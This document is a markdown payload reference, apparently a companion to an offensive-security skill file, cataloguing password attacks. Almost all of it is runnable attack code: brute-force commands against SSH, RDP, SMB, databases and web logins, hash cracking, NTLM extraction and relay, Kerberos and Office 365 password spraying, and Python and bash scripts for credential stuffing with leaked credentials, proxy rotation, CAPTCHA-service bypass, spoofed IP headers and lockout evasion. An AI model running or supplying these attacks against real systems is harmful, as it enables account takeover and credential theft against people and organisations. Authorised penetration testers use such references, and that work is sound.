# Password Attack Payloads

> This file is a companion to `SKILL.md`, organizing all password attack payloads into eight categories.

---

## 1. Online Attacks

### Hydra - SSH

```bash
# Basic SSH brute force
hydra -l admin -P passwords.txt ssh://192.168.1.100

# Multi-user + speed control
hydra -L users.txt -P passwords.txt ssh://192.168.1.100 -t 4 -W 3

# Stop on success
hydra -L users.txt -P passwords.txt -t 4 -W 5 -f ssh://target
# -t concurrent threads  -W interval between attempts (seconds)  -f stop on first success
```

### Hydra - FTP

```bash
# FTP brute force
hydra -l admin -P passwords.txt ftp://192.168.1.100

# FTP multi-threaded
hydra -l admin -P passwords.txt -t 8 ftp://192.168.1.100
```

### Hydra - HTTP POST Form

```bash
# HTTP POST form brute force (note syntax: URL parameters:success/failure indicators)
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect"

# With both failure and success indicators
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login.php:username=^USER^&password=^PASS^:S=Welcome:F=Invalid"
```

### Hydra - HTTP GET Basic Auth

```bash
# HTTP GET basic auth brute force
hydra -l admin -P passwords.txt target.com http-get /admin/

# With custom header
hydra -l admin -P passwords.txt target.com http-get -H "Authorization: Basic ^BASE64^" /api/
```

### Hydra - MySQL / Databases

```bash
# MySQL database brute force
hydra -l root -P passwords.txt mysql://192.168.1.100

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://192.168.1.100

# MSSQL
hydra -l sa -P passwords.txt mssql://192.168.1.100
```

### Hydra - RDP

```bash
# RDP brute force (requires xfreerdp support)
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# RDP low speed to avoid lockout
hydra -l administrator -P passwords.txt -t 1 -W 10 rdp://192.168.1.100
```

### Hydra - SMB

```bash
# SMB brute force
hydra -l administrator -P passwords.txt smb://192.168.1.100

# SMB multi-module
hydra -L users.txt -P passwords.txt smb://192.168.1.100 -t 2
```

### Medusa - Multi-Protocol Parallel

```bash
# SSH brute force
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# Parallel multi-host
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh -t 4

# FTP brute force
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ftp

# HTTP form
medusa -h target.com -u admin -P passwords.txt -M web-form \
  -m FORM:"/login.php" -m FORM-DATA:"post?user=^USER^&pass=^PASS^" \
  -m DENY-SIGNAL:"Invalid"
```

### Patator - Multi-Protocol Framework

```bash
# SSH brute force
patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt

# FTP brute force
patator ftp_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt

# HTTP POST form
patator http_fuzz url=http://target.com/login method=POST \
  body="user=admin&pass=FILE0" 0=passwords.txt \
  -x ignore:fgrep='Invalid password'
```

---

## 2. Offline Hash Cracking

### Hashcat - Dictionary Attack (Attack Mode 0)

```bash
# Basic dictionary attack - NTLM
hashcat -a 0 -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Dictionary attack - SHA-256
hashcat -a 0 -m 1400 sha256_hashes.txt rockyou.txt

# Dictionary attack - bcrypt
hashcat -a 0 -m 3200 bcrypt_hashes.txt rockyou.txt
```

### Hashcat - Rule Attacks

```bash
# best64 rule - common transformations
hashcat -a 0 -m 1000 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# dive rule - deep transformations
hashcat -a 0 -m 1000 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule

# T0XlC rule - advanced transformations
hashcat -a 0 -m 1000 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/T0XlC.rule

# Multiple rules stacked
hashcat -a 0 -m 1000 ntlm_hashes.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/clem9669_medium.rule
```

### Hashcat - Combination Attack (Attack Mode 1)

```bash
# Combine words from two dictionaries
hashcat -a 1 -m 1000 hashes.txt dict1.txt dict2.txt

# Combination attack + rules
hashcat -a 1 -m 1000 hashes.txt dict1.txt dict2.txt -j "u" -k "d"
```

### Hashcat - Mask Brute Force (Attack Mode 3)

```bash
# Uppercase + 3 lowercase + 3 digits + symbol
hashcat -a 3 -m 1000 hashes.txt ?u?l?l?l?d?d?d?s

# Pure 8-digit number
hashcat -a 3 -m 1000 hashes.txt ?d?d?d?d?d?d?d?d

# Common pattern: first letter uppercase + lowercase + 4 digits
hashcat -a 3 -m 1000 hashes.txt ?u?l?l?l?l?d?d?d?d

# Mask character sets:
# ?l = abcdefghijklmnopqrstuvwxyz
# ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
# ?d = 0123456789
# ?s = special characters
# ?a = all characters
```

### Hashcat - Hybrid Attacks (Attack Mode 6/7)

```bash
# Append 4 digits to dictionary word (Mode 6: word+mask)
hashcat -a 6 -m 1000 hashes.txt rockyou.txt ?d?d?d?d

# Prepend 3 digits to dictionary word (Mode 7: mask+word)
hashcat -a 7 -m 1000 hashes.txt ?d?d?d rockyou.txt
```

### Hashcat - Session Management and Recovery

```bash
# Create named session
hashcat -a 0 -m 1000 hashes.txt rockyou.txt --session crack1

# Restore interrupted session
hashcat --session crack1 --restore
```

### John the Ripper - Basic Cracking

```bash
# Auto-detect hash type and crack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Single crack mode - use username/GECOS info to generate candidate passwords
john --single hashes.txt

# Incremental mode - brute force with progressively expanding character sets
john --incremental hashes.txt

# Specify format and rules
john --format=nt --wordlist=rockyou.txt --rules=Single ntlm_hashes.txt

# Show cracked results
john --show hashes.txt
```

### John the Ripper - File Password Cracking

```bash
# ZIP file
zip2john protected.zip > zip_hash.txt
john --wordlist=rockyou.txt zip_hash.txt

# Office document
office2john document.xlsx > office_hash.txt
john --wordlist=rockyou.txt office_hash.txt

# KeePass database
keepass2john database.kdbx > keepass_hash.txt
john --wordlist=rockyou.txt keepass_hash.txt

# PDF document
pdf2john document.pdf > pdf_hash.txt
john --wordlist=rockyou.txt pdf_hash.txt
```

---

## 3. Wordlist Generation and Mutation

### Cewl - Website Crawling Wordlist

```bash
# Basic crawling
cewl https://target.com -d 2 -m 4 -w website_words.txt
# -d crawl depth  -m minimum word length  -w output file

# Crawl with authentication
cewl https://target.com -u admin -p password -d 3 -m 5 -w auth_words.txt

# Generate lowercase variants
cewl https://target.com -d 2 -m 4 --lowercase -w lower_words.txt

# Include email addresses
cewl https://target.com -d 2 -m 4 -e -w words_with_emails.txt
```

### Crunch - Pattern Wordlist Generation

```bash
# Generate password wordlist by pattern
crunch 6 8 -t Company@%%% -o pattern_dict.txt
# @ = lowercase letter  , = uppercase letter  % = digit  ^ = symbol

# Pure numeric wordlist
crunch 4 4 0123456789 -o pin_dict.txt

# Custom character set
crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -o custom_dict.txt

# Specify character set
crunch 6 6 abcdef123456 -o hex_dict.txt
```

### John the Ripper Rule Mutation

```bash
# Use built-in rules
john --wordlist=base.txt --rules --stdout > mangled_dict.txt

# Use custom rules (defined in john.conf)
john --wordlist=base.txt --rules=KoreLogic > korelogic_dict.txt

# Single crack mode to generate candidate passwords
john --single --wordlist=base.txt --stdout > single_mangled.txt
```

### Wordlist Merging and Deduplication

```bash
# Merge multiple wordlists and deduplicate
cat website_words.txt mangled_dict.txt rockyou.txt | sort -u > final_dict.txt

# Deduplicate using uniq (must sort first)
sort dict1.txt dict2.txt | uniq > merged_unique.txt
```

---

## 4. Hash Type Identification

### Hashcat Identification

```bash
# Auto-detect hash type
hashcat --identify hashes.txt
```

### Common Hash Characteristic Reference

| Hash Prefix/Characteristic | Algorithm | Hashcat Mode | John Format |
|---------------|------|-------------|-------------|
| `$2b$` / `$2y$` | bcrypt | 3200 | bcrypt |
| `$6$` | SHA-512 crypt | 1800 | sha512crypt |
| `$5$` | SHA-256 crypt | 7400 | sha256crypt |
| `$1$` | MD5 crypt | 500 | md5crypt |
| 32 hex chars | MD5 | 0 | raw-md5 |
| 40 hex chars | SHA-1 | 100 | raw-sha1 |
| 64 hex chars | SHA-256 | 1400 | raw-sha256 |
| 128 hex chars | SHA-512 | 1700 | raw-sha512 |
| `aad3b435b51404ee...` | NTLM | 1000 | nt |
| `$kerberoast$` | Kerberos TGS | 13100 | krb5tgs |
| `$DCC2$` | Domain Cached Credentials v2 | 2100 | mscash2 |
| `{xtra}` / `$NT$` | NT hash | 1000 | nt |

---

## 5. Password Spray Attacks

### Concept

Password spraying uses a small number of common passwords to test a large number of accounts, avoiding account lockout policies. This is the opposite of traditional brute forcing (trying many passwords against one account).

### Hydra Password Spraying

```bash
# Test single password against multiple users
hydra -L all_users.txt -p "Spring2026!" ssh://target -t 2 -W 10

# Multi-protocol spraying
for pw in "Password1" "Welcome1" "Spring2026!" "Company2026"; do
  hydra -L users.txt -p "$pw" ssh://192.168.1.100 -t 1 -W 5
done
```

### Kerberos Password Spraying

```bash
# kerbrute password spraying
kerbrute passwordspray -d domain.local --dc 192.168.1.1 users.txt "Spring2026!"

# crackmapexec password spraying
crackmapexec smb 192.168.1.0/24 -u users.txt -p "Welcome1!" --no-bruteforce
```

### Common Spray Password List

```
Password1
Welcome1
Spring2026!
Summer2026!
Winter2026!
Company2026!
P@ssw0rd
Changeme1
Letmein1
Password123
```

---

## 6. Credential Stuffing

### Concept

Using leaked credential pairs (username/password) to attempt login to other services. Based on the behavioral pattern of users reusing passwords across sites.

### Hydra Credential Stuffing

```bash
# Use credential pair list
hydra -C credentials.txt http-post-form://target.com \
  "/login:user=^USER^&pass=^PASS^:F=Invalid"

# Credential pair file format (user:password):
# admin:password123
# user1:Welcome1
```

### Cross-Protocol Credential Testing

```bash
# Test SSH credentials
for cred in $(cat known_creds.txt); do
  user=$(echo "$cred" | cut -d: -f1)
  pass=$(echo "$cred" | cut -d: -f2)
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@target" "echo success" 2>/dev/null
done

# Test SMB credentials
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce
```

---

## 7. NTLM / NetNTLM Attacks

### NTLM Hash Extraction

```bash
# Extract from SAM database
secretsdump.py -sam SAM -system SYSTEM LOCAL

# Extract from NTDS.dit (domain controller)
secretsdump.py domain/admin:password@dc_ip -ntds NTDS.dit

# Extract using mimikatz
# sekurlsa::logonpasswords
# lsadump::sam
```

### NTLM Relay Attacks

```bash
# ntlmrelayx relay
ntlmrelayx.py -t smb://192.168.1.100 -smb2support

# Relay to LDAP
ntlmrelayx.py -t ldap://dc_ip -wh attacker_ip

# Multi-target relay
ntlmrelayx.py -tf targets.txt -smb2support
```

### NetNTLMv1/v2 Capture and Cracking

```bash
# Use Responder to capture challenge/response
responder -I eth0 -wrf

# Crack NetNTLMv2 hashes (hashcat mode 5600)
hashcat -a 0 -m 5600 netntlmv2_hashes.txt rockyou.txt

# Crack NetNTLMv1 hashes (hashcat mode 5500)
hashcat -a 0 -m 5500 netntlmv1_hashes.txt rockyou.txt
```

---

## 8. Password Policy Analysis

### Windows Password Policy Enumeration

```bash
# Use crackmapexec to enumerate password policy
crackmapexec smb 192.168.1.100 --pass-pol

# Use ldapsearch to enumerate
ldapsearch -x -H ldap://dc_ip -b "DC=domain,DC=local" \
  "(objectClass=domainDNS)" maxPwdAge minPwdAge minPwdLength pwdHistoryLength \
  pwdProperties

# Use net command
net accounts /domain
```

### Linux Password Policy Check

```bash
# Check PAM password policy
cat /etc/security/pwquality.conf
cat /etc/pam.d/common-password

# Check /etc/login.defs
grep -E "PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_MIN_LEN|PASS_WARN_AGE" /etc/login.defs

# Check user password aging
chage -l username
```

### Policy Analysis Reference Points

| Policy Parameter | Security Baseline | Attack Exploitation |
|----------|---------|---------|
| Minimum password length | >= 12 characters | Length < 8 allows fast brute force |
| Password complexity | Uppercase + lowercase + digits + special | No complexity allows pure dictionary attacks |
| Password history | >= 12 | No history limit allows cycling old passwords |
| Lockout threshold | 5-10 failed attempts | High threshold increases online brute force success rate |
| Lockout duration | >= 30 minutes | Short lockout allows sustained slow brute force |
| Password expiration | 90 days | Overly long expiration increases exposure window |

---

## 9. Hashcat Advanced Modes

### Custom Rule Creation

```bash
# Create custom hashcat rule file for targeted attacks
cat > custom.rule << 'EOF'
# Append year variations
$2$0$2$5
$2$0$2$6
$!
$@
$#
# Capitalize first, append digits
c $1
c $1$2$3
c $!
# Leet speak substitutions
sa@ se3 si1 so0
# Toggle case patterns
T0 T1 T2
EOF

# Run with custom rules
hashcat -a 0 -m 1000 hashes.txt wordlist.txt -r custom.rule
```

### Prince Attack (Probabilistic Password Generation)

```bash
# PRINCE attack - generates password candidates from wordlist combinations
hashcat -a 0 -m 1000 hashes.txt wordlist.txt --prince

# PRINCE with element length limits
hashcat -a 0 -m 1000 hashes.txt wordlist.txt \
  --prince-elem-cnt-min=2 --prince-elem-cnt-max=4

# PRINCE with keyspace estimation
hashcat -a 0 -m 1000 hashes.txt wordlist.txt --prince --keyspace
```

### Mask Attack with Custom Charsets

```bash
# Define custom charset: company-specific characters
hashcat -a 3 -m 1000 hashes.txt -1 'Cc' -2 'oO0' -3 'mM' -4 '!@#$' ?1?2?3pany?d?d?d?4

# Incremental mask length (6 to 12 characters)
hashcat -a 3 -m 1000 hashes.txt ?a?a?a?a?a?a --increment --increment-min=6 --increment-max=12

# Mask file for multiple patterns
cat > masks.hcmask << 'EOF'
?u?l?l?l?l?d?d?d?d
?u?l?l?l?l?l?d?d?d
?u?l?l?l?d?d?d?s
?d?d?d?d?d?d?d?d
Company?d?d?d?d
EOF
hashcat -a 3 -m 1000 hashes.txt masks.hcmask
```

### Combinator Attack with Rules

```bash
# Combine two wordlists with rules applied to each side
hashcat -a 1 -m 1000 hashes.txt left.txt right.txt -j 'c' -k '$!'
# -j rule applied to left dict, -k rule applied to right dict

# Generate combinator candidates for inspection
hashcat -a 1 --stdout left.txt right.txt | head -100

# Triple combination via piping
hashcat -a 1 --stdout dict1.txt dict2.txt | hashcat -a 0 -m 1000 hashes.txt -r best64.rule
```

### Hashcat Brain (Distributed Deduplication)

```bash
# Start hashcat brain server (deduplicates work across sessions)
hashcat --brain-server --brain-host=0.0.0.0 --brain-port=13743 --brain-password=secret

# Client connects to brain server
hashcat -a 0 -m 1000 hashes.txt rockyou.txt \
  --brain-client --brain-host=192.168.1.100 --brain-port=13743 --brain-password=secret

# Check brain server status
hashcat --brain-server-status --brain-host=192.168.1.100 --brain-port=13743
```

### GPU Benchmark and Optimization

```bash
# Benchmark all hash types
hashcat -b

# Benchmark specific hash type
hashcat -b -m 1000

# Optimize workload for specific GPU
hashcat -a 0 -m 1000 hashes.txt rockyou.txt -w 3 -O
# -w 3 = high workload profile  -O = optimized kernels (limits password length to 32)

# Multi-GPU selection
hashcat -a 0 -m 1000 hashes.txt rockyou.txt -d 1,2 --force
```

---

## 10. Online Brute Force Advanced Techniques

### Hydra Advanced Protocol Attacks

```bash
# SMTP brute force
hydra -l admin@target.com -P passwords.txt smtp://mail.target.com -s 587 -S -V

# SNMP community string brute force
hydra -P community_strings.txt target snmp

# VNC brute force (password only, no username)
hydra -P passwords.txt vnc://192.168.1.100 -t 1

# IMAP brute force
hydra -l user@target.com -P passwords.txt imap://mail.target.com -S

# Cisco enable password
hydra -P passwords.txt cisco-enable://192.168.1.1
```

### Medusa Advanced Usage

```bash
# Medusa with combo file (user:pass pairs)
medusa -C credentials.txt -h 192.168.1.100 -M ssh

# Medusa with module-specific parameters
medusa -h target.com -u admin -P passwords.txt -M web-form \
  -m FORM:"/api/login" \
  -m FORM-DATA:"post?username=&password=" \
  -m DENY-SIGNAL:"401" \
  -m CUSTOM-HEADER:"Content-Type: application/json"

# Medusa parallel host scanning
medusa -H hosts.txt -u root -P top100.txt -M ssh -t 2 -T 5
# -t threads per host  -T total parallel hosts
```

### Custom Brute Force Scripts

```python
import requests
import itertools
import string
from concurrent.futures import ThreadPoolExecutor

def brute_force_pin(target_url, username, pin_length=4):
    """Brute force numeric PIN with threading"""
    session = requests.Session()
    found = None

    def try_pin(pin):
        nonlocal found
        if found:
            return
        r = session.post(target_url, json={
            "username": username,
            "pin": pin
        })
        if r.status_code == 200 and "success" in r.text.lower():
            found = pin
            print(f"[+] PIN found: {pin}")

    pins = [str(i).zfill(pin_length) for i in range(10**pin_length)]
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(try_pin, pins)

    return found

brute_force_pin("http://target/api/verify-pin", "admin", pin_length=4)
```

### Ncrack Network Authentication Cracker

```bash
# Ncrack SSH brute force with timing template
ncrack -p ssh -U users.txt -P passwords.txt 192.168.1.100 -T3

# Ncrack RDP with connection limit
ncrack -p rdp -u administrator -P passwords.txt 192.168.1.100 -g CL=1,to=30s

# Ncrack multiple services simultaneously
ncrack 192.168.1.100:22,3389,21 -U users.txt -P passwords.txt -T2
```

### HTTP Authentication Brute Force with Session Handling

```python
import requests
import re

def brute_force_with_csrf(target, usernames, passwords):
    """Brute force login form that uses CSRF tokens"""
    for user in usernames:
        for pwd in passwords:
            session = requests.Session()
            # Get fresh CSRF token
            login_page = session.get(f"{target}/login")
            csrf = re.search(r'name="csrf_token" value="([^"]+)"', login_page.text)
            if not csrf:
                continue
            # Submit with CSRF token
            r = session.post(f"{target}/login", data={
                "username": user,
                "password": pwd,
                "csrf_token": csrf.group(1)
            })
            if "dashboard" in r.url or r.status_code == 302:
                print(f"[+] Valid: {user}:{pwd}")
                return user, pwd
    return None

brute_force_with_csrf("http://target", ["admin"], open("passwords.txt").read().splitlines())
```

---

## 11. Password Spraying Techniques

### Active Directory Password Spraying

```bash
# Spray with kerbrute (fast, no lockout if careful)
kerbrute passwordspray -d corp.local --dc 10.0.0.1 domain_users.txt "Spring2026!"

# Spray with crackmapexec (SMB)
crackmapexec smb 10.0.0.1 -u domain_users.txt -p "Welcome1!" --no-bruteforce --continue-on-success

# Spray with crackmapexec (LDAP)
crackmapexec ldap 10.0.0.1 -u domain_users.txt -p "Company2026!" --no-bruteforce

# Spray with rpcclient
while read user; do
  rpcclient -U "$user%Spring2026!" 10.0.0.1 -c "getusername" 2>/dev/null | grep -q "Account Name" && \
    echo "[+] Valid: $user:Spring2026!"
done < domain_users.txt
```

### Web Application Password Spraying

```python
import requests
import time

def web_spray(target, users_file, passwords, delay=30):
    """Spray passwords against web app with timing evasion"""
    users = open(users_file).read().splitlines()

    for password in passwords:
        print(f"[*] Spraying: {password}")
        for user in users:
            r = requests.post(f"{target}/api/login", json={
                "username": user,
                "password": password
            })
            if r.status_code == 200 and "token" in r.json():
                print(f"[+] VALID: {user}:{password}")
            elif r.status_code == 429:
                print(f"[!] Rate limited. Sleeping 60s...")
                time.sleep(60)
        # Wait between password attempts to avoid lockout
        print(f"[*] Waiting {delay}s before next password...")
        time.sleep(delay)

web_spray("http://target", "users.txt",
          ["Password1!", "Welcome2026!", "Spring2026!", "Company123!"],
          delay=30)
```

### Timing-Based Lockout Evasion

```bash
#!/bin/bash
# Spray with lockout-aware timing
LOCKOUT_THRESHOLD=5
LOCKOUT_WINDOW=1800  # 30 minutes in seconds
SPRAY_DELAY=35       # minutes between sprays (exceeds lockout window / threshold)

PASSWORDS=("Spring2026!" "Welcome1!" "Password123" "Company2026!")

for pw in "${PASSWORDS[@]}"; do
    echo "[*] $(date): Spraying password: $pw"
    crackmapexec smb 10.0.0.1 -u users.txt -p "$pw" --no-bruteforce --continue-on-success \
      2>/dev/null | grep -E "\[\+\]" | tee -a spray_results.txt
    echo "[*] Sleeping ${SPRAY_DELAY}m to avoid lockout..."
    sleep $((SPRAY_DELAY * 60))
done
```

### O365/Azure AD Password Spraying

```bash
# Using MSOLSpray for Office 365
python3 MSOLSpray.py --userlist users.txt --password "Spring2026!" --url https://login.microsoftonline.com

# Using Ruler for Exchange
ruler --domain target.com brute --users users.txt --passwords spray_passwords.txt --delay 30

# Using Spray tool for Azure AD
spray.sh -smb 10.0.0.1 -u users.txt -p "Welcome2026!" -d corp.local
```

### Spray Password Generation Based on Policy

```python
import itertools
from datetime import datetime

def generate_spray_passwords(company_name, year=None):
    """Generate likely passwords based on common patterns and company info"""
    if not year:
        year = datetime.now().year

    seasons = ["Spring", "Summer", "Fall", "Winter"]
    months = ["January", "February", "March", "April", "May", "June",
              "July", "August", "September", "October", "November", "December"]
    suffixes = ["!", "@", "#", "1", "123", "1!"]

    passwords = []
    # Season + Year + suffix
    for season in seasons:
        for suffix in suffixes:
            passwords.append(f"{season}{year}{suffix}")

    # Company + digits + suffix
    for suffix in suffixes:
        passwords.append(f"{company_name}{year}{suffix}")
        passwords.append(f"{company_name}123{suffix}")

    # Month + Year
    for month in months:
        passwords.append(f"{month}{year}!")

    # Common patterns
    passwords.extend([f"Password{year}!", f"Welcome{year}!", f"Changeme{year}!"])

    return passwords

spray_list = generate_spray_passwords("Acme", 2026)
for p in spray_list:
    print(p)
```

---

## 12. Credential Stuffing Advanced

### Proxy Rotation for Credential Stuffing

```python
import requests
import itertools
import random

class ProxyRotator:
    def __init__(self, proxy_file):
        self.proxies = open(proxy_file).read().splitlines()
        self.cycle = itertools.cycle(self.proxies)
        self.failed = set()

    def get_proxy(self):
        for _ in range(len(self.proxies)):
            proxy = next(self.cycle)
            if proxy not in self.failed:
                return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        raise RuntimeError("All proxies exhausted")

    def mark_failed(self, proxy):
        self.failed.add(proxy)

def credential_stuff(target, creds_file, proxy_file):
    rotator = ProxyRotator(proxy_file)
    creds = [line.strip().split(":") for line in open(creds_file)]

    for user, pwd in creds:
        proxy = rotator.get_proxy()
        try:
            r = requests.post(f"{target}/login", json={"user": user, "pass": pwd},
                            proxies=proxy, timeout=10)
            if r.status_code == 200 and "token" in r.text:
                print(f"[+] VALID: {user}:{pwd}")
        except requests.exceptions.ProxyError:
            rotator.mark_failed(list(proxy.values())[0])

credential_stuff("http://target", "leaked_creds.txt", "proxies.txt")
```

### CAPTCHA Bypass Techniques

```python
import requests
import base64

def solve_captcha_with_service(image_url, api_key):
    """Use CAPTCHA solving service to bypass protection"""
    # Download captcha image
    img_data = requests.get(image_url).content
    img_b64 = base64.b64encode(img_data).decode()

    # Submit to solving service
    r = requests.post("http://captcha-solver-api/solve", json={
        "image": img_b64,
        "type": "recaptcha_v2",
        "api_key": api_key
    })
    return r.json().get("solution", "")

def stuff_with_captcha_bypass(target, creds, captcha_api_key):
    for user, pwd in creds:
        session = requests.Session()
        # Get login page with captcha
        page = session.get(f"{target}/login")
        # Solve captcha
        captcha_solution = solve_captcha_with_service(
            f"{target}/captcha/image", captcha_api_key
        )
        # Submit with solved captcha
        r = session.post(f"{target}/login", data={
            "username": user,
            "password": pwd,
            "captcha": captcha_solution
        })
        if "dashboard" in r.url:
            print(f"[+] Valid: {user}:{pwd}")
```

### Rate Limit Evasion Strategies

```bash
#!/bin/bash
# Distribute requests across multiple source IPs and user agents
USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
  "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15"
)

while IFS=: read -r user pass; do
  UA="${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}"
  IP="10.$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))"

  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://target/api/login \
    -H "User-Agent: $UA" \
    -H "X-Forwarded-For: $IP" \
    -H "X-Real-IP: $IP" \
    -d "{\"username\":\"$user\",\"password\":\"$pass\"}")

  [ "$code" = "200" ] && echo "[+] Valid: $user:$pass"
  sleep 0.$((RANDOM%5))
done < leaked_creds.txt
```

### Credential Validation Pipeline

```python
import asyncio
import aiohttp

async def validate_credentials(target, creds, concurrency=20):
    """High-performance async credential validation"""
    valid = []
    semaphore = asyncio.Semaphore(concurrency)

    async def check_cred(session, user, pwd):
        async with semaphore:
            try:
                async with session.post(f"{target}/api/login",
                    json={"username": user, "password": pwd}) as resp:
                    if resp.status == 200:
                        body = await resp.json()
                        if body.get("authenticated"):
                            valid.append(f"{user}:{pwd}")
                            print(f"[+] Valid: {user}:{pwd}")
            except Exception:
                pass

    async with aiohttp.ClientSession() as session:
        tasks = [check_cred(session, u, p) for u, p in creds]
        await asyncio.gather(*tasks)

    print(f"\n[*] Results: {len(valid)}/{len(creds)} valid credentials")
    return valid

creds = [line.strip().split(":") for line in open("creds.txt")]
asyncio.run(validate_credentials("http://target", creds))
```

### Leaked Database Processing

```bash
# Process and deduplicate leaked credential databases
# Extract email:password pairs from various leak formats
grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s]+' raw_leak.txt | sort -u > clean_creds.txt

# Filter for target domain
grep "@target.com:" clean_creds.txt > target_creds.txt

# Remove known invalid/test entries
grep -v -E "(test|example|dummy|fake)" target_creds.txt > filtered_creds.txt

# Generate username variants from email
awk -F'[:@]' '{print $1":"$3}' filtered_creds.txt > user_pass_pairs.txt

# Statistics
echo "Total pairs: $(wc -l < filtered_creds.txt)"
echo "Unique users: $(cut -d: -f1 filtered_creds.txt | sort -u | wc -l)"
echo "Unique passwords: $(cut -d: -f2 filtered_creds.txt | sort -u | wc -l)"
```
